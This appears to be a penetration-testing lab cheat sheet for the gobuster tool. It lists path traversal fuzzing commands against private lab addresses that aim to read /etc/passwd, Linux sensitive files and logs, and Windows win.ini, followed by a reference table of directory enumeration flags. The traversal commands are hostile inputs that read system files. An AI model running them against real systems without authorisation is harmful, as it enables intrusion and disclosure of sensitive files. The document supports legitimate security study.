# Directory Brute Force

## Path Traversal Fuzzing

Brute force path traversal with a valid session cookie, excluding 302 responses, and proxying through Burp:

```bash
gobuster fuzz -u "http://192.168.213.209/welcome.php?file=FUZZ" -w ~/wordlists/path-traversal/etc-passwd-traversal.txt --proxy http://127.0.0.1:8080 -b 302 -c "Cookie: PHPSESSID=strvnpgakqmeupj4neosglgbrf"
```

```bash
gobuster fuzz -u "http://192.168.112.181/public/plugins/cloudwatch/../../../../../../../../../../../../../FUZZ" -w ~/wordlists/path-traversal/linuxLogsAll --proxy http://127.0.0.1:8080
```

```bash
gobuster fuzz -u "http://192.168.112.181/public/plugins/cloudwatch/../../../../../../../../../../../../..FUZZ" -w ~/wordlists/path-traversal/linuxSensitiveFiles --proxy http://127.0.0.1:8080
```

```bash
gobuster fuzz -u "http://192.168.197.99/FUZZWindows%2Fwin.ini" -w /home/kali/wordlists/path-traversal/BaseTraversalFileRaw --proxy http://127.0.0.1:5100
```

---

## Directory Enumeration (dir mode)

### Flag Reference

| Flag | Description |
|------|-------------|
| `dir` | Target files and directories |
| `-H` | Custom header |
| `-a` | Appends to default User-Agent |
| `-U` | Custom User-Agent |
| `-s` | Status codes to report |
| `-k` | Skips SSL certificate verification |
| `-t` | Thread limit (e.g. `-t 3` = 3 threads) |
| `--delay` | Time each thread waits between requests (e.g. `500ms`) |
| `--proxy` | Proxy to use |
| `-o` | Output file |
| `-x` | File extensions (see `gobuster dir --help`) |
| `-b` | Status codes to exclude |
| `-c` | Cookie string |

### Examples

Basic with custom headers and appended User-Agent:

```bash
gobuster dir -u https://example.com/api -w /path/to/wordlist.txt -H "Authorization: Bearer your_token_here" -H "Abacus: 7" -a "abacus" -s "200,201,202,204,301,302,307,401,403,404,429" -k
```

Full options with proxy, rate limiting, and output:

```bash
gobuster dir -u https://example.com/api -w /path/to/wordlist.txt -H "Authorization: Bearer your_token_here" -H "Abacus: 7" -U "customuserAgentValue" -s "200,201,202,204,301,302,307,401,403,404,429" -k --proxy http://127.0.0.1:8080 -t 3 --delay 500 -o output.txt
```

> **Tip:** Use `gobuster dir --help` to see additional flags that can be used with the dir flag, e.g. `-x` for file extensions.
